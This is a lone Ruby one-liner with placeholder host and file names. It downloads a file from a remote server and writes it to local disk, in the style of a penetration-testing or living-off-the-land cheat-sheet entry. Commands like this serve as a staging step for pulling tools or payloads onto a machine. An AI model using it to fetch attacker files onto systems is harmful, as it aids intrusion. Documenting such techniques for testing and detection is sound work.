ruby -e 'require "net/http"; File.write("<FILE>", Net::HTTP.get(URI.parse("https://<URL/IP>/<FILE>")))'
